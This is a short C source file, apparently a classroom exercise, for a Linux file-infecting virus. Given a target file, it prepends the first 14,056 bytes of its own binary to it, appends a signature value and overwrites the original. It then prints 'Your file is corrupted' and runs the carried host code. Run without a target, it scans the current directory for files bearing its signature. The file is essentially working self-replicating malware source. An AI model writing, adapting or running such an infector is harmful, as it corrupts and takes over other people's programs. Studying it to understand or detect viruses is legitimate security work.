#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <fcntl.h>       	
#include <unistd.h>

#define SIGNATURE 192101
#define SIZE 14056
#define TEMP_FILENAME ".temp"

void copyCode(char* fileName, int fd) {
    int cFd = open(fileName, O_RDONLY);	
    struct stat st;
    fstat(cFd, &st);

    int fileSize = st.st_size;
    int signature = SIGNATURE;
    int tfd = creat(TEMP_FILENAME, st.st_mode);	

    sendfile(tfd, fd, NULL, SIZE);
    sendfile(tfd, cFd, NULL, fileSize);
    write(tfd, &signature, sizeof(signature));

    rename(TEMP_FILENAME, fileName);

    close(tfd);
    close(cFd);
}

void loadCorruptExec(int fd, mode_t mode, int totalSize, char *argv[]) {
    int tfd = creat(TEMP_FILENAME, mode);

    lseek(fd, SIZE, SEEK_SET);
    int signatureSize = sizeof(SIGNATURE);
    int fileSize = totalSize - SIZE - signatureSize;
    sendfile(tfd, fd, NULL, fileSize);
    close(tfd);

    // Load Automatically after getting corrupt.
    execv(TEMP_FILENAME, argv);
}

void infect(char *argv[]) {
    int fd = open(argv[0], O_RDONLY);
    struct stat st;
    fstat(fd, &st);

    // Print Payload message
    puts("Your file is corrupted");

    // Target is taken by command line, so no need of selectTarget,
    // though elf format is preffered to get executed
    copyCode(argv[1], fd);
    loadCorruptExec(fd, st.st_mode, st.st_size, argv);

	close(fd);
}

void detect() {
    DIR *dir = opendir("./");
    struct dirent *dp;
    while((dp = readdir(dir)) != NULL){
        int signature;
        int fd = open(dp->d_name, O_RDONLY);
        lseek(fd, -1 * sizeof(signature), SEEK_END);
        read(fd, &signature, sizeof(signature));
        close(fd);
        if (signature == SIGNATURE)
            printf ("\nInfected File: %s\n\n", dp->d_name);
    }

    closedir(dir);
}

void main(int argc, char *argv[]) {
    if (argv[1] != NULL)
        infect(argv);
    else
        detect();
}